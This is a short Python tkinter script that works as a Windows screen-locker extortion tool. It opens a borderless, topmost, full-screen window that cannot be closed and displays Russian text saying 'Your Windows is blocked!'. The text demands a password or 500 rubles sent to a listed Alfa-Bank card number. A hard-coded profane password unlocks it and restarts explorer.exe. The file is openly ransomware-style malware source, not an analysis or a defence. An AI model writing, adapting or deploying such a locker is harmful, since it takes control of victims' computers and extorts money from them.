from tkinter import *
from subprocess import Popen as cmd
import sys
NameFile = sys.argv[0]
root = Tk()
def CheckPassword(arg):
    if password.get() == "говно":
        root.destroy()
        cmd("start explorer.exe", shell=True)
        
        try:
            quit()
        except:
            cmd(f"taskkill /f /in {NameFile}", shell=True)
                                             
       
X = root.winfo_screenwidth()
Y = root.winfo_screenheight()
"Win+*"
bg = "black"
root ["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)
Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведите пароль или отправьте 500p на каpту 2200 1513 2305 8151 альфа банк", fg="white", bg=bg, font=font).pack()
password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
root.mainloop()
